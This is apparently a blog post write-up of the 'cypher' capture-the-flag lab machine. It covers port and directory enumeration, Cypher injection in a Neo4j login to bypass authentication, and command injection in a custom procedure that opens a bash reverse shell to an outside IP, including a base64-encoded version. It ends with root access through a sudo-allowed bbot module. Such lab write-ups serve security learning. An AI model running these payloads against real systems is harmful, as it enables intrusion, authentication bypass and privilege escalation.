---
layout: post
title: "cypher"
date: 2025-08-06 
categories: ctf
---
# cypher

First let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV 10.10.11.57
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let’s add the domain name to /etc/hosts and visit the website. Let’s also open burp.

Let’s also fuzz the dir as well:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://cypher.htb/FUZZ -ic

index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 22ms]
                        [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 26ms]
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 39ms]
about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 42ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 30ms]
api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 30ms]
```

Let’s visit testing as it returned something. We can download a java archive. Let’s save that and try and see the decompiled source code. To do this, we need to install jadx-gui:

[https://github.com/skylot/jadx/releases/tag/v1.5.2](https://github.com/skylot/jadx/releases/tag/v1.5.2)

Now unzip the jadx and execute:

```bash
./bin/jadx-gui
```

Now we can browse to open project → pick our java archive we donwloaded from /testing, and go to source code

![image.png]({{ site.baseurl }}/assets/cypher/image.png)

Nothing more to do here. Let’s move on first:

We see a login page and attempt admin:admin. It fails. Now let’s try SQLinjection:

![image.png]({{ site.baseurl }}/assets/cypher/image%201.png)

We see an error. It seems to be vulnerable. Let’s use sqlmap. First turn intercept on in burp and capture and save the POST request:

![image.png]({{ site.baseurl }}/assets/cypher/image%202.png)

Now let’s use sqlmap:

```bash
sqlmap -r req.txt --batch --dump

sqlmap -r req.txt --batch --dump --level 5 --risk 3 --random-agent --ignore-case 401,400

```

Does not work. Let’s go back and see the error message from our injection on repeater:

![image.png]({{ site.baseurl }}/assets/cypher/image%203.png)

 

```bash
MATCH (u:USER) - [:SECRET] -> (h:SHA1) HWERE u.name = ''' return h.value as hash
```

After researching the error message, we find out the web app is processing a neo4j cypher query, and the action performed is:

- **MATCH (u:USER) -[:SECRET]-> (h:SHA1)**:
    
    Finds a user node `u` with label `USER` that has a relationship `SECRET` to another node `h` labeled `SHA1`.
    
- **WHERE u.name = ''**:
    
    Filters the result to where the user's `name` property equals to our username input string
    
- **RETURN h.value AS hash**:
    
    Returns the `value` property from the `SHA1` node as `hash,` which should probably be the password. 
    

### 📜 Original Query (From Error Message)

```
MATCH (u:USER) -[:SECRET]-> (h:SHA1)
WHERE u.name = ''
RETURN h.value AS hash

```

This looks like it's part of an **authentication system**. Likely pseudocode in the backend might be:

```python
username = input("username")
password = input("password")
query = f"MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = '{username}' RETURN h.value AS hash"

```

Then the app probably does:

```python
if hash_input(password) == returned_hash:
    // login success

```

---

## 🧠 Context Recap: Cypher Injection in Neo4j

Imagine the backend code is doing something insecure like this (in Python or Node.js, etc.):

```python
query = "MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = '" + username + "' RETURN h.value as hash"

```

If you can **control `username`**, you can inject Cypher code directly into the query

---

## 🧪 Example: Safe vs Injected Input

If you enter a normal username like:

```
admin

```

Then the query becomes:

```
MATCH (u:USER)-[:SECRET]->(h:SHA1)
WHERE u.name = 'admin'
RETURN h.value AS hash

```

✅ This is safe and works as intended.

---

## 🚨 What Happens with an Injected Input

Now, let’s say you enter this **as the username input**:

```
' OR true RETURN "hacked" AS hash //

```

The final query becomes:

```
MATCH (u:USER)-[:SECRET]->(h:SHA1)
WHERE u.name = '' OR true RETURN "hacked" AS hash //'
RETURN h.value AS hash

```

### 🔍 Let’s break it down:

- `'` closes the original string.
- `OR true` makes the condition always pass.
- `RETURN "hacked" AS hash` gives a fake result.
- `//` is a comment in Cypher — it **ignores the rest of the line**, like `-` in SQL.
- The final `' RETURN h.value AS hash` is **commented out**, so it’s ignored.

So the query **doesn't care about the database** anymore — it just returns `"hacked"` as the hash.

---

## 🧠 Why would someone do this?

Because many authentication systems work like this:

```python
result = run_cypher(query)
if sha1(password_input) == result["hash"]:
    login_success()

```

If the attacker makes `result["hash"]` equal to the hash of a password they know (like `"cypher"`), they can log in.

---

## ✅ Realistic Attack Payload Example

If I know:

- SHA1("cypher") = 27059a1e5d2f1832bc2cdd6a91b4b0da36b8b0f7

Then I enter this as the **username**:

```
' OR true RETURN "27059a1e5d2f1832bc2cdd6a91b4b0da36b8b0f7" AS hash //

```

And this as the **password**:

```
cypher

```

Now, the backend does:

```python
if sha1("cypher") == "27059a1e5d2f1832bc2cdd6a91b4b0da36b8b0f7":
    // Login success

```

Therefore, our username and password payload is:

```bash
#get the sha1sum of cypher:
echo -n admin | sha1sum

username:

' or true return 'd033e22ae348aeb5660fc2140aec35850c4da997' as hash //

password:

admin
```

We got a success and an access token:

![image.png]({{ site.baseurl }}/assets/cypher/image%204.png)

Let’s do the same thing by capturing the request on burp, changing the username and password payload to our cypher injection, then forward the data, ending intercept. We are logged in:

![image.png]({{ site.baseurl }}/assets/cypher/image%205.png)

Once logged in, we can select cypher queries from the drop down box. 

We can attempt a custom cypher query to see the relationship of users in this database:

```bash
MATCH ALL = (u:USER) - [r] - (connected) RETURN ALL
```

![image.png]({{ site.baseurl }}/assets/cypher/image%206.png)

We find user graphasm with password hash. 

If we click on Select Query, and pick HTTP Statuses, we get this query:

```bash
MATCH (n:DNS_NAME) WHERE n.scope_distance = 0 CALL custom.getUrlStatusCode(n.data) YIELD statusCode RETURN n.data, statusCode
```

The function called getURLStatusCode seems to be the same one we found earlier from the /testing dir in the java archive. Let’s take a closer look:

![image.png]({{ site.baseurl }}/assets/cypher/image.png)

```bash
        String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
```

This is the command being used. This seems to be vulnerable to command injection. Let’s test it out. Let’s call only getUrlStatusCode as a cypher query and inject another command:

```bash
CALL custom.getUrlStatusCode("http://example.com; whoami")
```

![image.png]({{ site.baseurl }}/assets/cypher/image%207.png)

We got back our command. Now that we know we can execute shell commands, let’s get a reverse shell back. Search up reverse shell generator and input our IP and port

```bash
bash -i >& /dev/tcp/10.10.16.5/4444 0>&1
```

Let’s base64 encode this then execute the encoded payload. First save it to a file:

```bash
cat rev.sh | base64 -w0

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0NDQgMD4mMQo=
```

Now our whole payload is:

```bash
CALL custom.getUrlStatusCode("http://example.com;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0NDQgMD4mMQo= | base64 -d | bash ")
```

It’s not working. The URL encoding of space to + seem to be causing error. Let’s add extra spaces like this:

```bash
bash -i  >& /dev/tcp/10.10.16.5/4444  0>&1
```

```bash
cat rev.sh | base64 -w0
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNS80NDQ0ICAwPiYxCg==

CALL custom.getUrlStatusCode("http://example.com;echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNS80NDQ0ICAwPiYxCg== | base64 -d | bash ")
```

Now it worked. We now have shell.

![image.png]({{ site.baseurl }}/assets/cypher/image%208.png)

Let’s go to our home directory:

```bash
#let's upgrade our shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

cd ~

neo4j@cypher:~$ pwd
pwd
/var/lib/neo4j
neo4j@cypher:~$ ls -la
ls -la
total 52
drwxr-xr-x 11 neo4j adm   4096 Feb 17 16:39 .
drwxr-xr-x 50 root  root  4096 Feb 17 16:48 ..
-rw-r--r--  1 neo4j neo4j   63 Oct  8  2024 .bash_history
drwxrwxr-x  3 neo4j adm   4096 Oct  8  2024 .cache
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 certificates
drwxr-xr-x  6 neo4j adm   4096 Oct  8  2024 data
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 import
drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 labs
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 licenses
-rw-r--r--  1 neo4j adm     52 Oct  2  2024 packaging_info
drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 plugins
drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 products
drwxr-xr-x  2 neo4j adm   4096 Aug  6 14:31 run
lrwxrwxrwx  1 neo4j adm      9 Oct  8  2024 .viminfo -> /dev/null

```

Let’s check out the .bash_history:

```bash
cat .bash_history

neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```

We seem to have a password. Looking at home, there is only user graphasm, let’s assume that the password is for that user:

```bash
ls /home
graphasm

```

```bash
ssh graphasm@10.10.11.57
```

We are in. We now have user.txt

```bash
ls -la 

lrwxrwxrwx 1 root     root        9 Oct  8  2024 .bash_history -> /dev/null
-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 bbot_preset.yml
drwx------ 2 graphasm graphasm 4096 Oct  8  2024 .cache
-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 .profile
drwx------ 2 graphasm graphasm 4096 Oct  8  2024 .ssh
-rw-r----- 1 root     graphasm   33 Aug  6 14:36 user.txt
```

Let’s also check our group membership and sudo privileges:

```bash
id
uid=1000(graphasm) gid=1000(graphasm) groups=1000(graphasm)

sudo -l

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

Searching up bbot in GTFObin did not yield any results. Let’s search up bbot github on Google.

```bash
cd /usr/local/bin/

./bbot
```

![image.png]({{ site.baseurl }}/assets/cypher/image%209.png)

![image.png]({{ site.baseurl }}/assets/cypher/image%2010.png)

And with this link, we can create out custom python module. First, we need to create a YAML file in /tmp/custom.yml

```bash
modules:
- mymodule

module_dirs:
- /tmp/my_modules
```

Now let’s create the module ourselves:

```bash
from bbot.modules.base import BaseModule
import os
os.system("cat /root/root.txt > /tmp/flag.txt")

def MyModule(BaseModule):
	watched_events = ["DNS_NAME"]
	async def handle_event(self, event):
		import os
		os.system("cat /root/root.txt > /tmp/flag.txt")
```

We can even get a reverse shell here if we want. 

Now that our module is created, let’s execute our payload with sudo:

```bash
sudo /usr/local/bin/bbot -p /tmp/custom.yml --force
```

Now we have the flag.